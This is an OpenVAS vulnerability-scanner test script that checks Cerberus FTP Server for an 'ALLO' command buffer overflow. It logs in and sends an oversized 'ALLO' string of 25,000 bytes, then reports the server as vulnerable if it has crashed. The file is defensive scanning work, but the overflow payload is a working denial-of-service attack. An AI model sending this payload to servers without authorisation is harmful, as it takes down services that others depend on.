###############################################################################
# OpenVAS Vulnerability Test
# $Id: cerberus_ftp_36134.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Cerberus FTP Server 'ALLO' Command Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Cerberus FTP Server is prone to a buffer-overflow vulnerability.

A successful exploit may allow attackers to execute arbitrary code in
the context of the vulnerable service. Failed exploit attempts will
likely cause denial-of-service conditions.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100260");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-08-26 11:37:11 +0200 (Wed, 26 Aug 2009)");
 script_bugtraq_id(36134);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("Cerberus FTP Server 'ALLO' Command Buffer Overflow Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/36134");
 script_xref(name : "URL" , value : "http://www.cerberusftp.com/index.html");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");

if(safe_checks())exit(0);

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

banner = get_ftp_banner(port:ftpPort);
if("Cerberus FTP" >!< banner)exit(0);

domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
 domain = this_host_name();;
}    

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "Anonymous";
if(!pass)pass = string("openvas@", domain);;

for(i=0;i<2;i++) {

  soc1 = open_sock_tcp(ftpPort);
  if(!soc1)exit(0);

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

  if(login_details)
  {
     ftpPort2 = ftp_get_pasv_port(socket:soc1);
     soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
     if(soc2) {
       crapData = string("ALLO ", crap(length: 25000),"\r\n");
       send(socket:soc1, data: crapData);
       close(soc2);
     }	
  }
  close(soc1);
}

sleep(5);

soc3 = open_sock_tcp(ftpPort);

if( ! ftp_recv_line(socket:soc3) ) {
  security_message(port:ftpPort);
  close(soc3);
  exit(0);
}  

exit(0); 

     
